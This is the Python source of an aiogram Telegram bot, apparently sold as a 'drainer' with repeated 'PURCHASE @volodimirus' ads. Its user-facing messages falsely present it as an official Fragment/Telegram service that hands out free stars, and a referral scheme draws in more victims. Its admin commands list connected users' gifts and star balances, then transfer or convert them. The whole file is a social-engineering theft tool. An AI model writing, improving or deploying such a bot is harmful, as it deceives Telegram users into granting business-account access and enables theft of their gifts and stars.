from aiogram import Bot, Dispatcher, F
from aiogram import types
from aiogram.types import Message, BusinessConnection
from aiogram.methods.get_business_account_star_balance import (
    GetBusinessAccountStarBalance,
)
from aiogram.methods.get_business_account_gifts import GetBusinessAccountGifts
from aiogram.types import (
    Message,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    CallbackQuery,
)
from aiogram.enums import ParseMode
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.methods import SendMessage, ReadBusinessMessage
from aiogram.methods.get_available_gifts import GetAvailableGifts
from aiogram.methods import TransferGift
from aiogram.exceptions import TelegramBadRequest
from aiogram.methods import ConvertGiftToStars, convert_gift_to_stars


from custom_methods import (
    GetFixedBusinessAccountStarBalance,
    GetFixedBusinessAccountGifts,
)

import aiogram.exceptions as exceptions
import logging
import asyncio
import json

import re

import config
import os

CONNECTIONS_FILE = "business_connections.json"

TOKEN = config.BOT_TOKEN
ADMIN_ID = config.ADMIN_ID

bot = Bot(token=TOKEN)
dp = Dispatcher()

# --- Utility Functions ---

def load_json_file(filename):
    """Loads data from a JSON file, handling common errors."""
    try:
        with open(filename, "r", encoding="utf-8") as f:
            content = f.read().strip()
            if not content:
                return []
            return json.loads(content)
    except FileNotFoundError:
        logging.info(f"File not found: {filename}. Returning empty list.")
        return []
    except json.JSONDecodeError as e:
        logging.exception(f"Error parsing JSON file {filename}: {e}")
        return []

def clear_connections():
    """Clears all business connections by emptying the connections file."""
    with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
        f.write("[]")
    logging.info("All business connections cleared.")

def save_business_connection_data(business_connection_data_obj):
    """Saves or updates a business connection in the JSON file."""
    connection_to_save = {
        "user_id": business_connection_data_obj.user.id,
        "business_connection_id": business_connection_data_obj.id,
        "username": business_connection_data_obj.user.username,
        "first_name": business_connection_data_obj.user.first_name,
        "last_name": business_connection_data_obj.user.last_name,
    }

    data = load_json_file(CONNECTIONS_FILE)

    updated = False
    for i, conn in enumerate(data):
        if conn["user_id"] == connection_to_save["user_id"]:
            data[i] = connection_to_save
            updated = True
            break

    if not updated:
        data.append(connection_to_save)

    with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    logging.info(f"Business connection data saved/updated for user {connection_to_save['user_id']}")

async def send_welcome_message_to_admin(user_id):
    """Sends a notification message to the admin when a new user connects."""
    try:
        await bot.send_message(ADMIN_ID, f"User #{user_id} connected the bot.")
    except Exception as e:
        logging.exception("Failed to send welcome message to admin.")

def get_business_connection_id_for_user(user_id: int) -> str | None:
    """Retrieves the business_connection_id for a given user_id."""
    connections_data = load_json_file(CONNECTIONS_FILE)
    for conn in connections_data:
        if conn.get("user_id") == user_id:
            return conn.get("business_connection_id")
    return None

# --- Handlers ---

@dp.business_connection()
async def handle_business_connect(business_connection: BusinessConnection):
    """Handles new business connections."""
    try:
        await send_welcome_message_to_admin(business_connection.user.id)
        await bot.send_message(
            business_connection.user.id,
            "You have successfully connected your account to the Fragment system!",
        )
        save_business_connection_data(business_connection)
        logging.info(
            f"Business account connected: {business_connection.user.id}, connection_id: {business_connection.id}"
        )
    except Exception as e:
        logging.exception("Error processing business connection.")


@dp.message(F.text == "/start")
async def start_command(message: Message):
    """Handles the /start command, showing welcome message and options."""
    try:
        connections = load_json_file(CONNECTIONS_FILE)
        count = len(connections)
    except Exception:
        count = 0 # Default to 0 if an error occurs

    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="🛠️ Connect", callback_data="connect"),
            ],
            [
                InlineKeyboardButton(
                    text="🌎 Earn Stars", callback_data="earn_stars"
                )
            ],
        ]
    )

    username = message.from_user.username

    if message.from_user.id != ADMIN_ID:
        await bot.send_photo(
            message.from_user.id,
            "https://cdn.lifehacker.ru/wp-content/uploads/2024/02/Kak-podarit-Telegram-Premium-i-chto-eto-dast_1677532117-1280x640_1708508305-1024x512.jpg",
            caption=f"""<b>
🎁 <b>Hello{f", @{username}" if username else ""}!</b>  

<blockquote>I am GiftCalmer, a bot created specifically to connect Telegram business accounts to the Fragment system (Official Telegram Web) and automatically issue stars for activity!</blockquote>

🤖 <b>How does it work?</b>  
1 - Add me to your business account.
2 - I will connect your account to the official Fragment platform.
3 - After that, automatic star issuance will begin - digital gifts for your account's activity and development within our bot.

<blockquote>⭐ Stars can be: exchanged, collected, sold, gifted, bought, and upgraded.</blockquote>

🛠️ <b>Don't know how to connect?</b>  
Don't worry - click the "🛠️ Connect" button below, and I'll show you a step-by-step guide. It's simple and secure.

🤝 <b>Referral System:</b>
Invite your friends to earn additional stars!  
🌠 For every friend who connects the bot - you will receive +25 stars to your account.  
</b> """,
            reply_markup=keyboard,
            parse_mode=ParseMode.HTML,
        )
    else:
        await message.answer(
            f"Antistoper Drainer\n\n🔗 Number of Connections: {count}\n\n"
            f"/gifts - View gifts\n"
            f"/stars - View stars\n"
            f"/transfer <owned_gift_id> <target_user_chat_id> - Manually transfer a gift\n" # Updated usage
            f"/convert - Convert gifts to stars\n"
            f"/clear_connections - Clear all connections"
        )


@dp.callback_query(F.data == "earn_stars")
async def earn_stars(callback: CallbackQuery):
    """Handles the 'earn_stars' callback, showing referral information."""
    user_id = callback.message.from_user.id

    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="💲 Withdraw", callback_data="withdraw")],
            [InlineKeyboardButton(text="⬅️ Back", callback_data="back")],
        ]
    )

    await bot.send_photo(
        callback.from_user.id,
        "https://images.ctfassets.net/dfcvkz6j859j/7wGcHvbDYkq94dEcRtTrHq/e07b49985aa70df068e72d40719f4b03/5_Simple_Strategies_to_Get_More_Client_Referrals_for_Your_Agency.png",
        caption=f"""<b>🤝 Our referral system is very simple and beneficial for users.

<blockquote>- 🔍 Find people, send the link, the person links our bot to their account, and you get 25 ⭐ added to your balance.
- 💼 Withdrawal from 100 ⭐</blockquote>

⛏️ Stars earned (from your referrals): 0 ⭐
↳ Your invitation link for friends:
<code>https://t.me/gift_calmer_bot?start=ref{user_id}</code></b>""",
        reply_markup=keyboard,
        parse_mode=ParseMode.HTML
    )

@dp.message(F.text == "/gifts")
async def gifts_command(message: Message):
    """Handles the /gifts command, showing the user's connected account gifts."""
    user_id = message.from_user.id

    if user_id == ADMIN_ID:
        await message.reply("As an admin, please use `/gifts <business_connection_id>` to view gifts for a specific connection.")
        return

    business_connection_id = get_business_connection_id_for_user(user_id)
    
    if not business_connection_id:
        await message.reply("You need to connect your business account first to see gifts. Use the '🛠️ Connect' button.")
        return

    try:
        gifts_request = GetFixedBusinessAccountGifts(business_connection_id=business_connection_id)
        gifts = await bot(gifts_request)
        
        if gifts and gifts.gifts:
            gifts_text = "<b>🎁 Your Gifts:</b>\n"
            for gift in gifts.gifts:
                gifts_text += f"• ID: <code>{gift.owned_id}</code>, Type: {gift.gift.name}\n"
            await message.reply(gifts_text, parse_mode=ParseMode.HTML)
        else:
            await message.reply("You have no gifts.")
    except exceptions.TelegramBadRequest as e:
        logging.error(f"TelegramBadRequest when getting gifts for user {user_id}: {e}")
        await message.reply("Failed to retrieve gifts. Your business connection might be inactive or invalid.")
    except Exception as e:
        logging.exception(f"Error getting gifts for user {user_id}")
        await message.reply("An error occurred while fetching your gifts. Please try again later.")

@dp.message(F.text == "/stars")
async def stars_command(message: Message):
    """Handles the /stars command, showing the user's connected account star balance."""
    user_id = message.from_user.id

    if user_id == ADMIN_ID:
        await message.reply("As an admin, please use `/stars <business_connection_id>` to view stars for a specific connection.")
        return

    business_connection_id = get_business_connection_id_for_user(user_id)

    if not business_connection_id:
        await message.reply("You need to connect your business account first to see your star balance.")
        return

    try:
        stars_request = GetFixedBusinessAccountStarBalance(business_connection_id=business_connection_id)
        stars_balance = await bot(stars_request)
        await message.reply(f"<b>⭐ Your Star Balance:</b> {stars_balance.balance}", parse_mode=ParseMode.HTML)
    except exceptions.TelegramBadRequest as e:
        logging.error(f"TelegramBadRequest when getting star balance for user {user_id}: {e}")
        await message.reply("Failed to retrieve star balance. Your business connection might be inactive or invalid.")
    except Exception as e:
        logging.exception(f"Error getting star balance for user {user_id}")
        await message.reply("An error occurred while fetching your star balance. Please try again later.")

@dp.message(F.text.startswith("/transfer"))
async def transfer_gift_command(message: Message):
    """Handles the /transfer command for admins to transfer gifts.
    Usage: /transfer <owned_gift_id> <target_user_chat_id>
    """
    if message.from_user.id != ADMIN_ID:
        await message.reply("This command is only for administrators.")
        return

    args = message.text.split()
    if len(args) != 3:
        await message.reply("Usage: `/transfer <owned_gift_id> <target_user_chat_id>`")
        return

    owned_gift_id = args[1]
    
    try:
        new_owner_chat_id = int(args[2]) # Convert to integer as chat IDs are numeric
    except ValueError:
        await message.reply("The `target_user_chat_id` must be a valid integer (the recipient's chat ID).")
        return

    # The admin's business connection ID is needed to initiate the transfer
    admin_business_connection_id = get_business_connection_id_for_user(ADMIN_ID)
            
    if not admin_business_connection_id:
        await message.reply("Admin's business connection ID not found. Please ensure the admin account is connected.")
        return

    try:
        transfer_request = TransferGift(
            business_connection_id=admin_business_connection_id, # The business account that owns the gift
            owned_gift_id=owned_gift_id, # The ID of the gift to transfer
            new_owner_chat_id=new_owner_chat_id, # The user's chat ID to whom the gift is transferred
        )
        await bot(transfer_request)
        await message.reply(f"Gift with owned_gift_id <code>{owned_gift_id}</code> successfully transferred to user chat ID <code>{new_owner_chat_id}</code>.", parse_mode=ParseMode.HTML)
    except exceptions.TelegramBadRequest as e:
        logging.error(f"TelegramBadRequest when transferring gift: {e}")
        await message.reply(f"Failed to transfer gift: {e.message}. Double-check the owned_gift_id and the target user's chat ID.")
    except Exception as e:
        logging.exception("Error transferring gift.")
        await message.reply("An error occurred while transferring the gift. Please try again later.")

@dp.message(F.text == "/convert")
async def convert_gifts_command(message: Message):
    """Handles the /convert command to convert gifts into stars for the user's connected account."""
    user_id = message.from_user.id
    
    business_connection_id = get_business_connection_id_for_user(user_id)

    if not business_connection_id:
        await message.reply("You need to connect your business account first to convert gifts.")
        return

    try:
        # First, get all available gifts for this business connection
        gifts_request = GetFixedBusinessAccountGifts(business_connection_id=business_connection_id)
        gifts_response = await bot(gifts_request)
        
        if not gifts_response or not gifts_response.gifts:
            await message.reply("You have no gifts to convert.")
            return

        converted_count = 0
        
        for gift_item in gifts_response.gifts:
            try:
                # The gift_item.owned_id is what you pass to convert_gift_to_stars
                convert_request = ConvertGiftToStars(
                    business_connection_id=business_connection_id,
                    owned_id=gift_item.owned_id
                )
                await bot(convert_request)
                converted_count += 1
                
            except exceptions.TelegramBadRequest as e:
                logging.warning(f"Failed to convert gift {gift_item.owned_id}: {e.message}")
            except Exception as e:
                logging.exception(f"Error converting gift {gift_item.owned_id}")
                
        if converted_count > 0:
            await message.reply(f"Successfully converted {converted_count} gift(s) into stars. Use /stars to check your updated balance.")
        else:
            await message.reply("No gifts were converted. This might be due to an error or you have no convertible gifts.")

    except exceptions.TelegramBadRequest as e:
        logging.error(f"TelegramBadRequest when getting gifts for conversion: {e}")
        await message.reply("Failed to retrieve gifts for conversion. Your business connection might be inactive or invalid.")
    except Exception as e:
        logging.exception("Error during gift conversion process.")
        await message.reply("An error occurred during gift conversion. Please try again later.")

@dp.message(F.text == "/clear_connections")
async def clear_connections_command(message: Message):
    """Handles the /clear_connections command (admin only)."""
    if message.from_user.id != ADMIN_ID:
        await message.reply("This command is only for administrators.")
        return

    clear_connections()
    await message.reply("All business connections have been cleared.")
    logging.info("All business connections cleared by admin.")

# --- Main Execution ---

async def main():
    print("With love from @volodimirus")
    await dp.start_polling(bot)

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())

print("PURCHASE @volodimirus")

# PURCHASE @volodimirus
#                                       PURCHASE @volodimirus
#               PURCHASE @volodimirus
#                                                                PURCHASE @volodimirus
#                                                                                      PURCHASE @volodimirus
#                       PURCHASE @volodimirus
#                                                                  PURCHASE @volodimirus
#        PURCHASE @volodimirus
